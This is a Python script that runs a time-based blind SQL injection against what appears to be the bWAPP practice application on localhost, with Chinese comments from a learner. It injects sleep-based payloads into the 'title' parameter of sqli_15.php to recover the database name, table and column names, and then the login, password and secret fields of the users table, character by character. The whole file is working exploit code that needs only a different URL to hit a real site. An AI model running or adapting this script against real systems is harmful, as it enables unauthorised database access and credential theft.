import time

import requests

url = 'http://localhost:9999/sqli_15.php'

header = {"Cookie": "security_level=0; PHPSESSID=gbujs40e93bb21kg0k0ej6q5o1"}


def get_length(time_wait=1, sql_object='database()'):
    for i in range(0, 1000):
        request_url = f"{url}?title=Iron Man' and length({sql_object})={i} and sleep({time_wait}) -- &action=search"
        time_start = time.time()
        requests.get(request_url, headers=header)
        if time.time() - time_start > time_wait:
            print('the length of {} is {}'.format(sql_object, i))
            return i
    else:
        print(f"can't get length of '{sql_object}'")


# 这个字符串的比较方式不区分大小写！
def get_str1(sql_length, time_wait=2, sql_object='database()'):
    for i in range(sql_length):
        for j in range(32, 127):
            request_url = f"{url}?title=Iron Man' and substr({sql_object}, {i + 1}, 1)='{chr(j)}'  and sleep({time_wait}) -- &action=search"
            time_start = time.time()
            requests.get(request_url, headers=header)
            if time.time() - time_start > time_wait:
                print(chr(j), end='')
                break
    else:
        print('')


def get_str_by_ascii_check(sql_length, time_wait=1, sql_object='database()'):
    for i in range(sql_length):
        for j in range(32, 127):
            request_url = f"{url}?title=Iron Man' and ASCII(substr({sql_object}, {i + 1}, 1))={j}  and sleep({time_wait}) -- &action=search"
            time_start = time.time()
            requests.get(request_url, headers=header)
            if time.time() - time_start > time_wait:
                print(chr(j), end='')
                break
    else:
        print('')


def get_str2(sql_length, time_wait=2,
             sql_object="(select group_concat(table_name) from information_schema.tables where table_schema='bWAPP') "):
    for i in range(sql_length):
        for j in range(32, 127):
            request_url = f"{url}?title=Iron Man' and ASCII(substr({sql_object}, {i + 1}, 1))={j}  and sleep({time_wait}) -- &action=search"
            time_start = time.time()
            requests.get(request_url, headers=header)
            if time.time() - time_start > time_wait:
                print(chr(j), end='')
                break
    else:
        print('')


if __name__ == '__main__':
    get_str_by_ascii_check(sql_length=get_length(), sql_object='database()')
    get_str_by_ascii_check(sql_length=get_length(
        sql_object="(select group_concat(table_name) from information_schema.tables where table_schema='bWAPP') "),
        sql_object="(select group_concat(table_name) from information_schema.tables where table_schema='bWAPP') ")
    get_str_by_ascii_check(sql_length=get_length(
        sql_object="(select group_concat(column_name) from information_schema.columns where table_name='users') "),
        sql_object="(select group_concat(column_name) from information_schema.columns where table_name='users') ")
    get_str_by_ascii_check(sql_length=get_length(
        sql_object="(select count(id) from bWAPP.users) "),
        sql_object="(select count(id) from bWAPP.users) ")
    # 以下为什么不行？
    # for a in range(2):
    #     get_str_by_ascii_check(sql_length=get_length(
    #         sql_object=f"(select group_concat(id,',',login,',',password) from (select id,login,password from bWAPP.users LIMIT {a},1)) "),
    #         sql_object=f"(select group_concat(id,',',login,',',password) from (select id,login,password from bWAPP.users LIMIT {a},1)) ")
    # 以下行，修正了上方代码关于sql查询语法的错误
    for a in range(2):
        get_str_by_ascii_check(sql_length=get_length(
            sql_object=f"(select group_concat(id,',',login,',',password,',',secret) from (select id,login,password,secret from bWAPP.users LIMIT {a},1) as aaa)"),
            sql_object=f"(select group_concat(id,',',login,',',password,',',secret) from (select id,login,password,secret from bWAPP.users LIMIT {a},1) as aaa)")
    # for a in range(2):
    #     get_str_by_ascii_check(sql_length=get_length(
    #         sql_object=f"(select group_concat(id,',',login,',',password) from bWAPP.users where id={a+1}) "),
    #         sql_object=f"(select group_concat(id,',',login,',',password) from bWAPP.users where id={a+1}) ")
